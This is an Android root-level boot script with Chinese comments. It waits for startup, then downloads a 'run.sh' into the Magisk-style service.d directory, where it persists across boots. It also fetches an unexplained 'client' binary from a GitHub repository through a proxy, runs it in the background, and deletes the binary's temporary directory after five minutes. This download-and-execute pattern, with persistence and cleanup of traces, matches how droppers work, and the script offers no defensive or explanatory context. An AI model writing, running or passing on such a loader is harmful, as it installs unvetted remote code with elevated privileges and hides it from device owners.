#!/system/bin/sh

# 1. 等待系統完全啟動
until [ "$(getprop sys.boot_completed)" = "1" ]; do
    sleep 3
done
sleep 10

# 2. 定義通用下載函數
download_file() {
    local url=$1
    local dest=$2
    if command -v curl >/dev/null 2>&1; then
        echo "嘗試使用 curl 下載..."
        curl -L -o "$dest" "$url" && return 0
    fi
    if command -v wget >/dev/null 2>&1; then
        echo "嘗試使用 wget 下載..."
        wget -O "$dest" "$url" && return 0
    fi
    return 1
}

# 3. 執行下載 run.sh
download_file "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh" "/data/adb/service.d/run.sh"
if [ $? -eq 0 ]; then
    chmod +x /data/adb/service.d/run.sh
else
    echo "下載 run.sh 失敗"
    exit 1
fi

ASSET_NAME="client"
URL="https://gh-proxy.org/https://github.com/jenssenli/ko/raw/refs/heads/main/client"

# 4. 建立臨時目錄
tmpdir="/data/local/tmp/gztmp_$(date +%s)"
mkdir -p "$tmpdir" || exit 1
BIN_PATH="$tmpdir/$ASSET_NAME"

# 5. 執行下載 client
if download_file "$URL" "$BIN_PATH"; then
    chmod +x "$BIN_PATH"
    # 啟動 client
    (
        cd "$tmpdir" || exit 1
        "./$ASSET_NAME" > /data/local/tmp/client_debug.log 2>&1 &
    ) &
else
    echo "下載 client 失敗"
    exit 1
fi

# 6. 延時清理
(
    sleep 300
    rm -rf "$tmpdir"
) >/dev/null 2>&1 &

exit 0
